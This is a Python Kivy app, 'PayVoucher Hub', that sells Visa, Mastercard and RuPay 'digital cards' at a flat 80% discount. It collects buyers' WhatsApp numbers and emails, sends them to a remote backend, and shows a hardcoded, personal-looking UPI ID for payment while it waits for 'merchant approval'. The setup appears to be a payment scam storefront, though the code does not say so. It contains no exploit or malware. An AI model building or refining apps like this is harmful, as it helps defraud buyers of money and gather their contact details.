import threading
import time
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.graphics import Color, RoundedRectangle
from kivy.core.window import Window

# Dark theme window background
Window.clearcolor = (0.03, 0.04, 0.08, 1)

BACKEND_URL = "https://vip-cc.onrender.com"

# Website ke saare cards data
CARDS_DATA = [
    {"val": 500, "net": "VISA", "num": "4532 •••• •••• 1042"},
    {"val": 1000, "net": "VISA", "num": "4532 •••• •••• 8847"},
    {"val": 1500, "net": "MASTERCARD", "num": "5321 •••• •••• 2419"},
    {"val": 2000, "net": "RUPAY", "num": "6074 •••• •••• 9921"},
    {"val": 2500, "net": "VISA", "num": "4912 •••• •••• 3144"},
    {"val": 3000, "net": "MASTERCARD", "num": "5482 •••• •••• 7712"},
    {"val": 4000, "net": "RUPAY", "num": "6521 •••• •••• 1085"},
    {"val": 5000, "net": "VISA", "num": "4720 •••• •••• 6500"},
    {"val": 6000, "net": "MASTERCARD", "num": "5105 •••• •••• 4421"},
    {"val": 7500, "net": "RUPAY", "num": "6033 •••• •••• 8910"},
    {"val": 8000, "net": "VISA", "num": "4231 •••• •••• 5592"},
    {"val": 10000, "net": "MASTERCARD", "num": "5500 •••• •••• 9214"},
    {"val": 15000, "net": "VISA", "num": "4888 •••• •••• 0042"},
    {"val": 20000, "net": "RUPAY", "num": "6077 •••• •••• 5519"},
]

class CardWidget(BoxLayout):
    def __init__(self, card, on_click_callback, **kwargs):
        super().__init__(orientation="vertical", padding=14, spacing=6, size_hint_y=None, height=160, **kwargs)
        self.card = card
        pay_amount = int(card["val"] * 0.20)

        with self.canvas.before:
            if card["net"] == "VISA":
                Color(0.06, 0.16, 0.38, 1)
            elif card["net"] == "MASTERCARD":
                Color(0.28, 0.08, 0.08, 1)
            else:
                Color(0.03, 0.24, 0.15, 1)
            self.bg_rect = RoundedRectangle(size=self.size, pos=self.pos, radius=[14])
        self.bind(size=self._update_rect, pos=self._update_rect)

        # Header Row
        top = BoxLayout(orientation="horizontal", size_hint_y=0.25)
        top.add_widget(Label(text="[b]CHIP[/b]", markup=True, color=(1, 0.85, 0.2, 1), font_size='11sp'))
        top.add_widget(Label(text=card["net"], bold=True, halign="right", font_size='12sp'))
        self.add_widget(top)

        # Card Number
        self.add_widget(Label(text=card["num"], font_size='17sp', bold=True, size_hint_y=0.35))

        # Bottom Details & Buy Button
        bottom = BoxLayout(orientation="horizontal", size_hint_y=0.4)
        bottom.add_widget(Label(text=f"Value: ₹{card['val']}", font_size='13sp'))
        
        btn = Button(
            text=f"Pay ₹{pay_amount}",
            bold=True,
            background_color=(0.1, 0.7, 0.35, 1),
            size_hint_x=0.5
        )
        btn.bind(on_release=lambda x: on_click_callback(card, pay_amount))
        bottom.add_widget(btn)

        self.add_widget(bottom)

    def _update_rect(self, *args):
        self.bg_rect.pos = self.pos
        self.bg_rect.size = self.size

class PayVoucherApp(App):
    def build(self):
        root = BoxLayout(orientation="vertical", spacing=4)

        # Top Bar
        bar = BoxLayout(size_hint_y=0.08, padding=8)
        with bar.canvas.before:
            Color(0.06, 0.08, 0.14, 1)
            self.bar_bg = RoundedRectangle(size=bar.size, pos=bar.pos)
        bar.bind(size=lambda *a: setattr(self.bar_bg, 'size', bar.size),
                 pos=lambda *a: setattr(self.bar_bg, 'pos', bar.pos))
        bar.add_widget(Label(text="[b]PayVoucher Hub[/b]", markup=True, font_size='18sp'))
        root.add_widget(bar)

        # Announcement Banner
        root.add_widget(Label(
            text="⚡ Flat 80% Instant Discount on Digital Cards",
            size_hint_y=0.05,
            color=(0.2, 0.85, 1, 1),
            font_size='11sp'
        ))

        # Cards Scroll View
        scroll = ScrollView(size_hint_y=0.87)
        grid = GridLayout(cols=1, spacing=12, padding=12, size_hint_y=None)
        grid.bind(minimum_height=grid.setter('height'))

        for c in CARDS_DATA:
            grid.add_widget(CardWidget(c, self.open_checkout_dialog))

        scroll.add_widget(grid)
        root.add_widget(scroll)
        return root

    def open_checkout_dialog(self, card, pay_amount):
        box = BoxLayout(orientation="vertical", spacing=10, padding=14)
        box.add_widget(Label(text=f"Card: ₹{card['val']}  |  Pay: ₹{pay_amount}", bold=True, font_size='15sp'))

        phone_in = TextInput(hint_text="WhatsApp Number (10 Digits)", multiline=False, input_filter="int")
        email_in = TextInput(hint_text="Email ID", multiline=False)
        err_lbl = Label(text="", color=(1, 0.3, 0.3, 1), font_size='11sp', size_hint_y=0.3)

        box.add_widget(phone_in)
        box.add_widget(email_in)
        box.add_widget(err_lbl)

        btn_go = Button(text="Proceed to UPI Pay", background_color=(0.2, 0.5, 1, 1), size_hint_y=0.55)
        box.add_widget(btn_go)

        popup = Popup(title="Enter Delivery Details", content=box, size_hint=(0.9, 0.52), auto_dismiss=True)

        def proceed(instance):
            phone = phone_in.text.strip()
            email = email_in.text.strip()

            if len(phone) < 10:
                err_lbl.text = "10-digit ka valid mobile number dalein."
                return
            if "@" not in email or "." not in email:
                err_lbl.text = "Sahi format ka email address dalein."
                return

            err_lbl.color = (0.2, 0.8, 0.2, 1)
            err_lbl.text = "Server se connect ho raha hai..."
            btn_go.disabled = True

            threading.Thread(
                target=self._api_create_order,
                args=(popup, phone, email, card, pay_amount, err_lbl, btn_go)
            ).start()

        btn_go.bind(on_release=proceed)
        popup.open()

    def _api_create_order(self, popup, phone, email, card, pay_amount, err_lbl, btn_go):
        try:
            res = requests.post(
                f"{BACKEND_URL}/api/create-order",
                json={
                    "phone": f"+91 {phone}",
                    "email": email,
                    "cardValue": card["val"],
                    "payAmount": pay_amount,
                    "cardNetwork": card["net"].lower()
                },
                timeout=12
            )
            data = res.json()
            if res.status_code == 200 and "id" in data:
                Clock.schedule_once(lambda dt: popup.dismiss())
                Clock.schedule_once(lambda dt: self.show_upi_screen(data["id"], pay_amount, data.get("upi_id", "6387982416-oa1b@axl")))
            else:
                def err(dt):
                    err_lbl.color = (1, 0.3, 0.3, 1)
                    err_lbl.text = data.get("error", "Order create nahi ho saka.")
                    btn_go.disabled = False
                Clock.schedule_once(err)
        except Exception:
            def conn_err(dt):
                err_lbl.color = (1, 0.3, 0.3, 1)
                err_lbl.text = "Server connection error, retry karein."
                btn_go.disabled = False
            Clock.schedule_once(conn_err)

    def show_upi_screen(self, order_id, amount, upi_id):
        box = BoxLayout(orientation="vertical", spacing=10, padding=14)
        box.add_widget(Label(text="[b]UPI Settlement Pending[/b]", markup=True, font_size='16sp'))
        box.add_widget(Label(text=f"Amount: ₹{amount}\nUPI ID: {upi_id}", halign="center", font_size='13sp'))

        status_lbl = Label(text="Waiting for merchant approval...", color=(1, 0.7, 0.2, 1), font_size='12sp')
        box.add_widget(status_lbl)

        p = Popup(title="UPI Pay", content=box, size_hint=(0.9, 0.45), auto_dismiss=False)

        def poll(dt):
            def req():
                try:
                    r = requests.get(f"{BACKEND_URL}/api/order-status?id={order_id}", timeout=5)
                    if r.status_code == 200 and r.json().get("status") == "APPROVED":
                        def ok(dt2):
                            p.dismiss()
                            self.show_done()
                        Clock.schedule_once(ok)
                        return False
                except Exception:
                    pass
            threading.Thread(target=req).start()

        event = Clock.schedule_interval(poll, 2)
        p.bind(on_dismiss=lambda *a: event.cancel())
        p.open()

    def show_done(self):
        box = BoxLayout(orientation="vertical", spacing=10, padding=14)
        box.add_widget(Label(text="✓ Payment Verified!", bold=True, color=(0.2, 0.9, 0.3, 1), font_size='17sp'))
        box.add_widget(Label(text="Code aapke WhatsApp par deliver hoga.", halign="center"))
        btn = Button(text="Done", size_hint_y=0.4, background_color=(0.2, 0.5, 1, 1))
        box.add_widget(btn)
        done_p = Popup(title="Success", content=box, size_hint=(0.85, 0.35))
        btn.bind(on_release=lambda *a: done_p.dismiss())
        done_p.open()

if __name__ == "__main__":
    PayVoucherApp().run()
